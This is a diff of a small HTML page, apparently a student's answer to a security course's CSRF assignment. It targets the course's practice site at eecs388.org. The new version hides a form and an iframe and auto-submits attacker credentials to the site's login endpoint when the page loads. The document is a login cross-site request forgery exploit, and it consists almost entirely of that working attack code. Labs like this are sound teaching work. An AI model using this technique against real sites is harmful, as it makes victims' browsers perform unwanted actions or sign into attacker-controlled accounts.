@@ -1,16 +1,21 @@
 <html><body>
 <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.4/jquery.min.js"></script>
 
-<form id="form1" method="post" style="display: none;">
-  <input name="username" value="attacker">
-  <input name="password" value="l33th4x">
-</form> 
+<style>
+    iframe, form, input{display: none}
+</style>
+
+<iframe name='ohshitwatuptreverhiro'></iframe>
+
+<form method="post"
+      action="https://eecs388.org/project2/login?csrfdefense=0&xssdefense=4"
+      target='ohshitwatuptreverhiro'>
+    <input name="username" value="attacker">
+    <input name="password" value="l33th4x">
+</form>
 
 <script>
-  $.ajax({
-    type: 'POST', 
-    data: $('#form1').serialize(),
-    url: 'https://eecs388.org/project2/login?csrfdefense=0&xssdefense=4',
-    xhrFields: {withCredentials: true} // Necessary if you want to send and set cookies });
-</script> 
+  $('form').submit();
+</script>
+
 </body></html>
